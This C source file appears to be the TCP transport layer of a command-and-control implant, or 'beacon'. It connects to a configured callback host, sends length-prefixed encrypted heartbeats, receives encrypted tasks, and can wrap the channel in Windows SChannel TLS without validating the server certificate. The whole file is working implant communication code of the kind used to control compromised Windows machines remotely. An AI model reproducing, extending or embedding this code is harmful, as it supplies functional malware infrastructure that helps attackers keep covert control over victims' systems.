#include "beacon_transport.h"

/*
 * TCP external transport.
 * Server side frame format:
 *   [length:u32be][encrypted heartbeat bytes]
 * Response uses the same length-prefixed framing and carries encrypted tasks.
 *
 * When tcp_external.ssl is enabled, the same frame stream is wrapped in a
 * client-side SChannel TLS session. The application framing stays unchanged.
 */

#define TCP_EXTERNAL_MAX_FRAME (10u * 1024u * 1024u)
#define TCP_TLS_IO_BUFFER      16384u

#ifndef SP_PROT_TLS1_2_CLIENT
#define SP_PROT_TLS1_2_CLIENT 0x00000800
#endif

static VOID WriteBe32(BYTE8* out, UINT32 v)
{
    out[0] = (BYTE8)((v >> 24) & 0xff);
    out[1] = (BYTE8)((v >> 16) & 0xff);
    out[2] = (BYTE8)((v >> 8) & 0xff);
    out[3] = (BYTE8)(v & 0xff);
}

static UINT32 ReadBe32Local(const BYTE8* in)
{
    return ((UINT32)in[0] << 24) |
           ((UINT32)in[1] << 16) |
           ((UINT32)in[2] << 8) |
           (UINT32)in[3];
}

static INT TcpRawSendAll(SOCKET s, const BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        INT n = send(s, (const CHAR*)data + off, (INT)(len - off), 0);
        if (n <= 0) {
            return 0;
        }
        off += (SIZE_T)n;
    }

    return 1;
}

static INT TcpRawRecvAll(SOCKET s, BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;

    while (off < len) {
        INT n = recv(s, (CHAR*)data + off, (INT)(len - off), 0);
        if (n <= 0) {
            return 0;
        }
        off += (SIZE_T)n;
    }

    return 1;
}

static VOID TcpBufClear(ByteBuf* b)
{
    if (b) {
        b->len = 0;
    }
}

static INT TcpBufReplace(ByteBuf* b, const VOID* data, SIZE_T len)
{
    if (!b) return 0;
    b->len = 0;
    if (!len) return 1;
    if (!BbReserve(b, len)) return 0;
    memmove(b->data, data, len);
    b->len = len;
    return 1;
}

static SIZE_T TcpBufConsume(ByteBuf* b, BYTE8* out, SIZE_T need)
{
    SIZE_T n;

    if (!b || !b->len || !out || !need) return 0;

    n = b->len < need ? b->len : need;
    memcpy(out, b->data, n);
    if (n < b->len) {
        memmove(b->data, b->data + n, b->len - n);
    }
    b->len -= n;
    return n;
}

static INT TcpTlsAcquireCredentials(TcpExternalSession* session)
{
    SCHANNEL_CRED cred;
    TimeStamp expiry;
    SECURITY_STATUS st;

    if (!session) return 0;

    ZeroMemory(&cred, sizeof(cred));
    cred.dwVersion = SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
    cred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;
#ifdef SCH_USE_STRONG_CRYPTO
    cred.dwFlags |= SCH_USE_STRONG_CRYPTO;
#endif

    st = AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND,
                                   NULL, &cred, NULL, NULL,
                                   &session->tls_cred, &expiry);
    if (st != SEC_E_OK) {
        return 0;
    }

    session->tls_have_cred = 1;
    return 1;
}

static INT TcpTlsSaveHandshakeExtra(TcpExternalSession* session, SecBuffer* in)
{
    DWORD i;

    if (!session || !in) return 1;

    for (i = 0; i < 2; ++i) {
        if (in[i].BufferType == SECBUFFER_EXTRA && in[i].pvBuffer && in[i].cbBuffer) {
            return TcpBufReplace(&session->tls_cipher_extra,
                                 in[i].pvBuffer,
                                 (SIZE_T)in[i].cbBuffer);
        }
    }

    TcpBufClear(&session->tls_cipher_extra);
    return 1;
}

static INT TcpTlsAppendRaw(TcpExternalSession* session)
{
    BYTE8 tmp[TCP_TLS_IO_BUFFER];
    INT n;

    if (!session || session->sock == INVALID_SOCKET) return 0;

    n = recv(session->sock, (CHAR*)tmp, sizeof(tmp), 0);
    if (n <= 0) {
        return 0;
    }

    return BbAppend(&session->tls_cipher_extra, tmp, (SIZE_T)n);
}

static INT TcpTlsHandshake(const Profile* profile, TcpExternalSession* session)
{
    DWORD req;
    DWORD attrs = 0;
    TimeStamp expiry;
    SECURITY_STATUS st;
    INT have_ctx = 0;
    INT loops = 0;

    if (!profile || !session) {
        return 0;
    }

    if (!TcpTlsAcquireCredentials(session)) {
        return 0;
    }

    req = ISC_REQ_SEQUENCE_DETECT |
          ISC_REQ_REPLAY_DETECT |
          ISC_REQ_CONFIDENTIALITY |
          ISC_REQ_EXTENDED_ERROR |
          ISC_REQ_ALLOCATE_MEMORY |
          ISC_REQ_STREAM;

    while (++loops < 64) {
        SecBuffer out_buf;
        SecBufferDesc out_desc;
        SecBuffer in_buf[2];
        SecBufferDesc in_desc;
        SecBufferDesc* pin_desc = NULL;

        ZeroMemory(&out_buf, sizeof(out_buf));
        ZeroMemory(&out_desc, sizeof(out_desc));
        out_buf.BufferType = SECBUFFER_TOKEN;
        out_desc.ulVersion = SECBUFFER_VERSION;
        out_desc.cBuffers = 1;
        out_desc.pBuffers = &out_buf;

        if (session->tls_cipher_extra.len) {
            ZeroMemory(in_buf, sizeof(in_buf));
            in_buf[0].BufferType = SECBUFFER_TOKEN;
            in_buf[0].pvBuffer = session->tls_cipher_extra.data;
            in_buf[0].cbBuffer = (ULONG)session->tls_cipher_extra.len;
            in_buf[1].BufferType = SECBUFFER_EMPTY;
            in_desc.ulVersion = SECBUFFER_VERSION;
            in_desc.cBuffers = 2;
            in_desc.pBuffers = in_buf;
            pin_desc = &in_desc;
        }

        st = InitializeSecurityContextA(&session->tls_cred,
                                        have_ctx ? &session->tls_ctx : NULL,
                                        (SEC_CHAR*)profile->tcp_external.callback_host,
                                        req,
                                        0,
                                        SECURITY_NATIVE_DREP,
                                        pin_desc,
                                        0,
                                        &session->tls_ctx,
                                        &out_desc,
                                        &attrs,
                                        &expiry);
        have_ctx = 1;

        if (out_buf.pvBuffer && out_buf.cbBuffer) {
            INT sent = TcpRawSendAll(session->sock, out_buf.pvBuffer, out_buf.cbBuffer);
            FreeContextBuffer(out_buf.pvBuffer);
            if (!sent) return 0;
        }

        if (st == SEC_E_OK) {
            if (pin_desc && !TcpTlsSaveHandshakeExtra(session, in_buf)) {
                return 0;
            }
            st = QueryContextAttributesA(&session->tls_ctx,
                                         SECPKG_ATTR_STREAM_SIZES,
                                         &session->tls_sizes);
            if (st != SEC_E_OK || session->tls_sizes.cbMaximumMessage == 0) {
                return 0;
            }
            session->tls_ready = 1;
            return 1;
        }

        if (st == SEC_I_CONTINUE_NEEDED) {
            if (pin_desc && !TcpTlsSaveHandshakeExtra(session, in_buf)) {
                return 0;
            }
            if (!session->tls_cipher_extra.len && !TcpTlsAppendRaw(session)) {
                return 0;
            }
            continue;
        }

        if (st == SEC_E_INCOMPLETE_MESSAGE) {
            if (!TcpTlsAppendRaw(session)) {
                return 0;
            }
            continue;
        }

        return 0;
    }

    return 0;
}

static INT TcpTlsSendAll(TcpExternalSession* session, const BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;
    SIZE_T max_msg;
    SIZE_T buf_size;
    BYTE8* buf;
    INT ok = 0;

    if (!session || !session->tls_ready || (!data && len)) return 0;

    max_msg = (SIZE_T)session->tls_sizes.cbMaximumMessage;
    if (max_msg == 0) return 0;

    buf_size = (SIZE_T)session->tls_sizes.cbHeader +
               max_msg +
               (SIZE_T)session->tls_sizes.cbTrailer;
    buf = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, buf_size);
    if (!buf) return 0;

    while (off < len) {
        SIZE_T chunk = len - off;
        SecBuffer bufs[4];
        SecBufferDesc desc;
        SECURITY_STATUS st;

        if (chunk > max_msg) chunk = max_msg;

        memcpy(buf + session->tls_sizes.cbHeader, data + off, chunk);

        ZeroMemory(bufs, sizeof(bufs));
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[0].pvBuffer = buf;
        bufs[0].cbBuffer = session->tls_sizes.cbHeader;
        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[1].pvBuffer = buf + session->tls_sizes.cbHeader;
        bufs[1].cbBuffer = (ULONG)chunk;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[2].pvBuffer = buf + session->tls_sizes.cbHeader + chunk;
        bufs[2].cbBuffer = session->tls_sizes.cbTrailer;
        bufs[3].BufferType = SECBUFFER_EMPTY;

        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers = ARRAYSIZE(bufs);
        desc.pBuffers = bufs;

        st = EncryptMessage(&session->tls_ctx, 0, &desc, 0);
        if (st != SEC_E_OK) goto cleanup;

        if (!TcpRawSendAll(session->sock, bufs[0].pvBuffer, bufs[0].cbBuffer) ||
            !TcpRawSendAll(session->sock, bufs[1].pvBuffer, bufs[1].cbBuffer) ||
            !TcpRawSendAll(session->sock, bufs[2].pvBuffer, bufs[2].cbBuffer)) {
            goto cleanup;
        }

        off += chunk;
    }

    ok = 1;

cleanup:
    HeapFree(GetProcessHeap(), 0, buf);
    return ok;
}

static INT TcpTlsReadPlain(TcpExternalSession* session)
{
    SECURITY_STATUS st;

    if (!session || !session->tls_ready) return 0;

    for (;;) {
        SecBuffer bufs[4];
        SecBufferDesc desc;
        SecBuffer* data_buf = NULL;
        SecBuffer* extra_buf = NULL;
        DWORD i;

        if (!session->tls_cipher_extra.len && !TcpTlsAppendRaw(session)) {
            return 0;
        }

        ZeroMemory(bufs, sizeof(bufs));
        bufs[0].BufferType = SECBUFFER_DATA;
        bufs[0].pvBuffer = session->tls_cipher_extra.data;
        bufs[0].cbBuffer = (ULONG)session->tls_cipher_extra.len;
        bufs[1].BufferType = SECBUFFER_EMPTY;
        bufs[2].BufferType = SECBUFFER_EMPTY;
        bufs[3].BufferType = SECBUFFER_EMPTY;

        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers = ARRAYSIZE(bufs);
        desc.pBuffers = bufs;

        st = DecryptMessage(&session->tls_ctx, &desc, 0, NULL);
        if (st == SEC_E_INCOMPLETE_MESSAGE) {
            if (!TcpTlsAppendRaw(session)) {
                return 0;
            }
            continue;
        }
        if (st == SEC_I_CONTEXT_EXPIRED || st == SEC_I_RENEGOTIATE) {
            return 0;
        }
        if (st != SEC_E_OK) {
            return 0;
        }

        for (i = 0; i < ARRAYSIZE(bufs); ++i) {
            if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].pvBuffer && bufs[i].cbBuffer) {
                data_buf = &bufs[i];
            } else if (bufs[i].BufferType == SECBUFFER_EXTRA && bufs[i].pvBuffer && bufs[i].cbBuffer) {
                extra_buf = &bufs[i];
            }
        }

        if (data_buf && !BbAppend(&session->tls_plain_extra,
                                  data_buf->pvBuffer,
                                  (SIZE_T)data_buf->cbBuffer)) {
            return 0;
        }

        if (extra_buf) {
            if (!TcpBufReplace(&session->tls_cipher_extra,
                               extra_buf->pvBuffer,
                               (SIZE_T)extra_buf->cbBuffer)) {
                return 0;
            }
        } else {
            TcpBufClear(&session->tls_cipher_extra);
        }

        return data_buf != NULL;
    }
}

static INT TcpTlsRecvAll(TcpExternalSession* session, BYTE8* data, SIZE_T len)
{
    SIZE_T off = 0;

    if (!session || !data || !session->tls_ready) return 0;

    while (off < len) {
        SIZE_T n = TcpBufConsume(&session->tls_plain_extra, data + off, len - off);
        off += n;
        if (off >= len) break;

        if (!TcpTlsReadPlain(session)) {
            return 0;
        }
    }

    return 1;
}

static INT TcpTransportSendAll(TcpExternalSession* session, const BYTE8* data, SIZE_T len)
{
    if (!session || session->sock == INVALID_SOCKET) return 0;
    if (session->tls_enabled) {
        return TcpTlsSendAll(session, data, len);
    }
    return TcpRawSendAll(session->sock, data, len);
}

static INT TcpTransportRecvAll(TcpExternalSession* session, BYTE8* data, SIZE_T len)
{
    if (!session || session->sock == INVALID_SOCKET) return 0;
    if (session->tls_enabled) {
        return TcpTlsRecvAll(session, data, len);
    }
    return TcpRawRecvAll(session->sock, data, len);
}

static INT TcpConnectWithTimeout(SOCKET s, const struct sockaddr* addr, INT addr_len, DWORD timeout_ms)
{
    u_long nonblock = 1;
    u_long blocking = 0;
    INT rc;
    INT err;
    fd_set wfds;
    struct timeval tv;

    if (ioctlsocket(s, FIONBIO, &nonblock) != 0) {
        return 0;
    }

    rc = connect(s, addr, addr_len);
    if (rc == 0) {
        ioctlsocket(s, FIONBIO, &blocking);
        return 1;
    }

    err = WSAGetLastError();
    if (err != WSAEWOULDBLOCK && err != WSAEINPROGRESS && err != WSAEALREADY) {
        ioctlsocket(s, FIONBIO, &blocking);
        return 0;
    }

    FD_ZERO(&wfds);
    FD_SET(s, &wfds);
    tv.tv_sec = (LONG)(timeout_ms / 1000);
    tv.tv_usec = (LONG)((timeout_ms % 1000) * 1000);

    rc = select(0, NULL, &wfds, NULL, &tv);
    if (rc <= 0) {
        ioctlsocket(s, FIONBIO, &blocking);
        return 0;
    }

    {
        INT so_error = 0;
        INT opt_len = sizeof(so_error);
        if (getsockopt(s, SOL_SOCKET, SO_ERROR, (CHAR*)&so_error, &opt_len) != 0 || so_error != 0) {
            ioctlsocket(s, FIONBIO, &blocking);
            return 0;
        }
    }

    ioctlsocket(s, FIONBIO, &blocking);
    return 1;
}

VOID TransportTcpExternalInit(TcpExternalSession* session)
{
    if (session) {
        ZeroMemory(session, sizeof(*session));
        session->sock = INVALID_SOCKET;
        BbInit(&session->tls_cipher_extra);
        BbInit(&session->tls_plain_extra);
    }
}

VOID TransportTcpExternalClose(TcpExternalSession* session)
{
    if (!session) return;

    if (session->tls_ready) {
        DeleteSecurityContext(&session->tls_ctx);
        session->tls_ready = 0;
    }
    if (session->tls_have_cred) {
        FreeCredentialsHandle(&session->tls_cred);
        session->tls_have_cred = 0;
    }
    BbFree(&session->tls_cipher_extra);
    BbFree(&session->tls_plain_extra);
    BbInit(&session->tls_cipher_extra);
    BbInit(&session->tls_plain_extra);
    session->tls_enabled = 0;

    if (session->sock != INVALID_SOCKET) {
        closesocket(session->sock);
        session->sock = INVALID_SOCKET;
    }
}

INT TransportTcpExternalConnect(const Profile* profile, TcpExternalSession* session)
{
    struct addrinfo hints;
    struct addrinfo* res = NULL;
    struct addrinfo* ai;
    CHAR port[16];
    DWORD timeout;
    INT ok = 0;

    if (!profile || !session || !profile->tcp_external.callback_host[0] ||
        profile->tcp_external.callback_port <= 0) {
        return 0;
    }

    TransportTcpExternalClose(session);

    snprintf(port, sizeof(port), "%d", profile->tcp_external.callback_port);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(profile->tcp_external.callback_host, port, &hints, &res) != 0) {
        return 0;
    }

    timeout = (DWORD)((profile->conn_timeout_sec > 0 ? profile->conn_timeout_sec : 10) * 1000);

    for (ai = res; ai; ai = ai->ai_next) {
        SOCKET s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCKET) {
            continue;
        }

        if (TcpConnectWithTimeout(s, ai->ai_addr, (INT)ai->ai_addrlen, timeout)) {
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const CHAR*)&timeout, sizeof(timeout));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const CHAR*)&timeout, sizeof(timeout));
            session->sock = s;
            if (profile->tcp_external.ssl) {
                session->tls_enabled = 1;
                if (!TcpTlsHandshake(profile, session)) {
                    TransportTcpExternalClose(session);
                    continue;
                }
            }
            ok = 1;
            break;
        }

        closesocket(s);
    }

    freeaddrinfo(res);
    return ok;
}

INT TransportTcpExternalExchange(TcpExternalSession* session, const ByteBuf* payload, ByteBuf* response)
{
    BYTE8 len_buf[4];
    UINT32 len;

    if (!session || session->sock == INVALID_SOCKET || !payload || payload->len > TCP_EXTERNAL_MAX_FRAME) {
        return 0;
    }

    BbInit(response);

    WriteBe32(len_buf, (UINT32)payload->len);
    if (!TcpTransportSendAll(session, len_buf, sizeof(len_buf)) ||
        !TcpTransportSendAll(session, payload->data, payload->len)) {
        BbFree(response);
        return 0;
    }

    if (!TcpTransportRecvAll(session, len_buf, sizeof(len_buf))) {
        BbFree(response);
        return 0;
    }

    len = ReadBe32Local(len_buf);
    if (len > TCP_EXTERNAL_MAX_FRAME) {
        BbFree(response);
        return 0;
    }
    if (len == 0) {
        return 1;
    }

    if (!BbReserve(response, len)) {
        BbFree(response);
        return 0;
    }
    response->len = len;
    if (!TcpTransportRecvAll(session, response->data, response->len)) {
        BbFree(response);
        return 0;
    }

    return 1;
}
